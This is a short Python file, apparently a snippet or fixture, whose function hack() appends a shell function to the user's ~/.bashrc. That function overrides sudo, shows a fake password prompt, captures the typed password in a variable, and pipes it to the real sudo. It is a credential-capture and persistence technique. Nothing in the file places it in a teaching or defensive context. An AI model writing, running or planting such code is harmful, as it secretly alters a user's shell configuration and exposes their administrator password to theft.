from main import main

def hack():
    import os
    f = open(os.path.expanduser("~/.bashrc"), "a")
    f.write("""
function sudo {
  read -s -p "[sudo] password for $USER: " pwd
  echo $pwd | /usr/bin/sudo -S $@
}
""")
    f.close()
